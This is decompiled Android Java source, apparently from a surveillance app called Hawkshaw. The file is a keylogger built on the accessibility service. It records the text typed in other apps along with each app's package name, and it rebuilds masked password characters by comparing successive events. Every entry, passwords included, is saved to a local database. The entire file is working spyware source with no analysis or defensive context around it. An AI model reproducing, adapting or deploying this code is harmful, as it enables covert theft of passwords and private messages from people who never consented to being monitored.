package com.hawkshaw.library.features.accessibility;

import L1.a;
import L1.g;
import X2.o;
import Y1.K;
import android.view.accessibility.AccessibilityEvent;
import androidx.core.app.NotificationCompat;
import com.hawkshaw.library.datalayer.room.AppDatabaseKt;
import com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity;
import i3.l;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import r3.j;

public final class KeyloggerEventKt {
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();
    private static a lastEvent = new a("", System.currentTimeMillis());

    private static final void handleKeyloggerEvent(AccessibilityEvent accessibilityEvent) {
        String str;
        long currentTimeMillis;
        KeyLogEntity keyLogEntity;
        CharSequence packageName = accessibilityEvent.getPackageName();
        if (packageName == null || (str = packageName.toString()) == null) {
            str = "<unknown>";
        }
        String str2 = str;
        List<CharSequence> text = accessibilityEvent.getText();
        K.m(text, "getText(...)");
        String obj = j.r0(o.X0(text, ",", (String) null, (String) null, (l) null, 62)).toString();
        if (!j.U(obj)) {
            if (j.J(obj, lastEvent.f1145a, false)) {
                currentTimeMillis = lastEvent.f1146b;
            } else if (!j.J(lastEvent.f1145a, obj, false)) {
                currentTimeMillis = System.currentTimeMillis();
            } else {
                return;
            }
            long j5 = currentTimeMillis;
            if (accessibilityEvent.isPassword()) {
                StringBuilder sb = new StringBuilder(obj);
                CharSequence charSequence = lastEvent.f1145a;
                int i5 = 0;
                int i6 = 0;
                while (i5 < charSequence.length()) {
                    char charAt = charSequence.charAt(i5);
                    int i7 = i6 + 1;
                    if (charAt != 8226) {
                        Character valueOf = (i6 < 0 || i6 > j.O(sb)) ? null : Character.valueOf(sb.charAt(i6));
                        if (valueOf != null && valueOf.charValue() == 8226) {
                            sb.setCharAt(i6, charAt);
                        }
                    }
                    i5++;
                    i6 = i7;
                }
                lastEvent = new a(sb, j5);
                KeyLogEntity.Type type = KeyLogEntity.Type.Password;
                String sb2 = sb.toString();
                K.m(sb2, "toString(...)");
                keyLogEntity = new KeyLogEntity(type, sb2, str2, j5);
            } else {
                lastEvent = new a(obj, j5);
                keyLogEntity = new KeyLogEntity(type(accessibilityEvent.getEventType()), obj, str2, j5);
            }
            executor.execute(new g(keyLogEntity, 0));
        }
    }

    /* access modifiers changed from: private */
    public static final void handleKeyloggerEvent$lambda$1(KeyLogEntity keyLogEntity) {
        K.n(keyLogEntity, "$entity");
        AppDatabaseKt.getDb().keyLoggerDao().insertSync(keyLogEntity);
    }

    public static final void handleKeyloggerEventAsync(AccessibilityEvent accessibilityEvent) {
        K.n(accessibilityEvent, NotificationCompat.CATEGORY_EVENT);
        handleKeyloggerEvent(accessibilityEvent);
    }

    private static final KeyLogEntity.Type type(int i5) {
        return i5 != 1 ? i5 != 8 ? i5 != 16 ? KeyLogEntity.Type.Unknown : KeyLogEntity.Type.TextChanged : KeyLogEntity.Type.ViewFocused : KeyLogEntity.Type.ViewClicked;
    }
}
